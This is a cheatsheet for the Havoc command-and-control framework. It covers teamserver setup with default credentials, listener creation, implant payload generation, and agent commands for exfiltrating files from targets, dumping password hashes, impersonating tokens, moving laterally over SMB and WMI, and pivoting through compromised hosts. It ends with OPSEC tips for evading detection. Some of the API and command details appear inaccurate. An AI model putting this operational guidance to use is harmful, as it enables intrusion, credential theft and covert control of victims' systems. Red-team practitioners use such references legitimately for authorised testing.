# Havoc C2 Cheatsheet

## Quick Reference

### Starting Havoc

```bash
# Start teamserver
cd Havoc
./teamserver/havoc-server --profile profiles/havoc.yaotl

# Start teamserver with verbose output
./teamserver/havoc-server --profile profiles/havoc.yaotl -v

# Start client (in another terminal)
cd Havoc/client
./build/havoc-client
```

### Connection Details

```bash
# Default connection:
# Host: 127.0.0.1
# Port: 40056
# User: admin
# Password: password123
```

### Listener Management

```bash
# Via GUI: Listeners > Add Listener
# Configure:
#   - Name: http_listener
#   - Type: HTTP
#   - Host: http://your_ip:8080
#   - Port: 8080

# Via API:
# POST /api/listeners
# {
#   "name": "http_listener",
#   "type": "http",
#   "host": "http://192.168.1.100:8080",
#   "port": 8080
# }
```

### Payload Generation

```bash
# Via GUI: Listeners > Generate Payload
# Select listener, architecture, output format

# Via API:
# POST /api/generate
# {
#   "listener": "http_listener",
#   "arch": "x64",
#   "format": "exe",
#   "output": "implant.exe"
# }
```

### Demon Agent Commands

```bash
# System information
sysinfo
getuid
getprivs
getpid

# File operations
download C:\Users\target\file.txt
upload /path/to/file.exe C:\temp\
ls C:\Users
cat C:\Users\target\file.txt

# Process operations
ps
migrate <pid>
kill <pid>

# Network operations
ipconfig
route
arp
netstat

# Privilege escalation
hashdump
token::impersonate

# Lateral movement
smb_exec <target_ip> <user> <pass>
wmi_exec <target_ip> <user> <pass>
```

### Session Management

```bash
# Via GUI: Sessions tab
# Right-click session for options:
#   - Interact
#   - Kill
#   - Background
#   - Pivoting
#   - Properties
```

### Pivoting

```bash
# Via GUI: Right-click session > Pivoting
#   - SOCKS Proxy
#   - Port Forward

# SOCKS proxy configuration:
# Local Port: 1080
# Session: <session_id>
```

### C2 Profile Configuration

```yaml
# profiles/havoc.yaotl
Teamserver:
  Host: "0.0.0.0"
  Port: 40056
  User: "admin"
  Password: "password123"

Listeners:
  - Name: "http_listener"
    Type: "HTTP"
    Host: "http://your_ip:8080"
    Port: 8080
    Sleep: 60
```

### Custom C2 Profiles

```yaml
# HTTP profile example
HTTP:
  Method: "GET"
  URI: "/api/v1/data"
  Headers:
    - "User-Agent: Mozilla/5.0"
    - "Authorization: Bearer <token>"
  Response:
    Type: "JSON"
    Sleep: 60
```

### Python API

```python
from havoc import Havoc

# Connect to teamserver
h = Havoc("127.0.0.1", 40056, "admin", "password123")
h.connect()

# List sessions
sessions = h.sessions()

# Execute command
h.execute(session_id, "whoami")

# List listeners
listeners = h.listeners()
```

### External C2

```python
from havoc_external_c2 import ExternalC2

c2 = ExternalC2("127.0.0.1", 40056)
c2.connect()
# Implement custom agent communication
```

### OPSEC Tips

```bash
# Sleep obfuscation
# Configure in C2 profile: Sleep: 60-120

# Use encrypted communications
# Generate HTTPS certificates:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# Use legitimate domains
# Configure custom User-Agent in C2 profile

# Monitor for detection
# Check agent status in GUI
```

### Common Issues

```bash
# Build fails
# Install Qt packages:
sudo apt install qtbase5-dev qtchooser qt5-qmake qt5-qmspec

# Teamserver won't start
# Check Go installation:
go version
cd teamserver && go mod tidy

# Client can't connect
# Verify teamserver is running
# Check port 40056
netstat -tlnp | grep 40056
```
